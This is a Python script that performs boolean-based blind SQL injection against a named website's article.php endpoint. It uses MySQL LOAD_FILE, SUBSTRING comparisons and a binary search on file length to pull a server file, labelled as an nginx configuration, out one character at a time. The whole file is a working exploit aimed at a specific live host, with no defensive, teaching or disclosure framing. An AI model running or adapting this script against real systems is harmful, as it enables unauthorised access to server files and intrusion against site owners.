import urllib.request
import urllib.parse
import sys

BASE_URL = "https://umidigi.com/article.php?id=1+AND+"
FILE_PATH = "/tmp/ng.txt"

def check(cond):
    """Check a boolean condition via SQL injection"""
    url = BASE_URL + cond
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.getcode() == 200
    except:
        return False

def get_file_content(filepath, start=1, length=2000):
    """Extract file content using boolean injection"""
    print(f"Extracting {filepath} from position {start}, length {length}...")
    content = []
    
    for i in range(start, start + length):
        found = False
        # Try printable ASCII characters
        for c in range(32, 127):
            char = chr(c)
            # Escape single quote
            if char == "'":
                char = "\\'"
            cond = f"SUBSTRING(LOAD_FILE('{filepath}'),{i},1)='{char}'"
            if check(cond):
                content.append(c)
                found = True
                break
        if not found:
            # Try non-printable characters
            for c in range(0, 32):
                cond = f"ORD(SUBSTRING(LOAD_FILE('{filepath}'),{i},1))={c}"
                if check(cond):
                    content.append(c)
                    found = True
                    break
        if i % 50 == 0:
            sys.stdout.write(f"  Position {i}...\r")
            sys.stdout.flush()
    
    result = bytes(content).decode('utf-8', errors='replace')
    return result

# Get file length first
print("Getting file length...")
low, high = 0, 10000
while low < high:
    mid = (low + high + 1) // 2
    if check(f"LENGTH(LOAD_FILE('{FILE_PATH}'))>={mid}"):
        low = mid
    else:
        high = mid - 1

file_len = low
print(f"File length: {file_len}")

if file_len > 0:
    content = get_file_content(FILE_PATH, 1, file_len)
    print("\n" + "=" * 80)
    print("NGINX CONFIG:")
    print("=" * 80)
    print(content)
else:
    print("File is empty")
